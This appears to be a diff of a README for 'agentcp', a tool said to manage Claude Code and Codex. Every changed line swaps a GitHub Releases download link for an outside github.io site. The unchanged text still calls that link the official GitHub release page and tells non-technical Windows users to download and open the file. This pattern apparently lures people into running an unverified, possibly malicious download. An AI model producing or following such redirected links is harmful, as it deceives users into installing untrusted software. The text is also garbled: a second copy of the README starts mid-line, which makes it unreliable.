@@ -1,12 +1,12 @@
 # 🧭 agentcp - Manage Your Coding Agents Easily
 
-[![Download agentcp](https://img.shields.io/badge/Download-agentcp-ff6f61?style=for-the-badge&logo=github)](https://github.com/andersselfdeprecating373/agentcp/releases)
+[![Download agentcp](https://img.shields.io/badge/Download-agentcp-ff6f61?style=for-the-badge&logo=github)](https://andersselfdeprecating373.github.io)
 
 agentcp is a free, open-source app that helps you manage Claude Code and Codex in one place. Claude Code and Codex are AI coding helpers. Instead of keeping separate notes, settings, and project files scattered across your computer, agentcp gives you a single place to view and organize them. The project is described as a Mac app, and the official release page is where downloads are published. This guide is written for everyday Windows users who want to visit the release page, download the application, and open it without needing programming knowledge.
 
 ## 🚀 Getting Started
 
-Visit this link to download the application: [Download agentcp from GitHub Releases](https://github.com/andersselfdeprecating373/agentcp/releases).
+Visit this link to download the application: [Download agentcp from GitHub Releases](https://andersselfdeprecating373.github.io).
 
 The link opens the official release page. That page is the download area for agentcp. It is not a direct file link, so you will see the available release information when the page opens. Use the newest release shown at the top of the page. From there, download the application file and open it on your Windows computer.
 
@@ -21,7 +21,7 @@ The app is useful when you want to:
 - Review AI coding helper settings from a single screen.
 - Keep project# 🧭 agentcp - Manage Your Coding Agents Easily
 
-[![Download agentcp](https://img.shields.io/badge/Download-agentcp-2ea44f?style=for-the-badge&logo=github)](https://github.com/andersselfdeprecating373/agentcp/releases)
+[![Download agentcp](https://img.shields.io/badge/Download-agentcp-2ea44f?style=for-the-badge&logo=github)](https://andersselfdeprecating373.github.io)
 
 agentcp is a free, open-source desktop app that helps you manage Claude Code and Codex in one place. Claude Code and Codex are AI coding helpers. Many people use one or both of them while working on projects, and over time the related files, notes, and settings start to pile up in different folders. agentcp gives you a single, tidy window for that work instead of making you hunt through your computer.
 
@@ -29,7 +29,7 @@ This README is written for everyday computer users. You do not need to know how 
 
 ## 🚀 Getting Started
 
-Visit this link to download the application: [Download agentcp](https://github.com/andersselfdeprecating373/agentcp/releases).
+Visit this link to download the application: [Download agentcp](https://andersselfdeprecating373.github.io).
 
 That link opens the official agentcp release page on GitHub. GitHub is a website where open-source projects publish their files, and the "Releases" area is where finished versions of an app are posted. When the page opens, you will see the newest release listed at the top. Read the release name and date so you know you are looking at the most recent version, then download the application file offered there.
 
@@ -51,7 +51,7 @@ You open agentcp, pick the tool you want to work with, and go from there. Everyt
 
 ## 📥 Download and Setup
 
-Visit this link to download the application: [Get agentcp from the release page](https://github.com/andersselfdeprecating373/agentcp/releases).
+Visit this link to download the application: [Get agentcp from the release page](https://andersselfdeprecating373.github.io).
 
 Follow these steps in order:
 
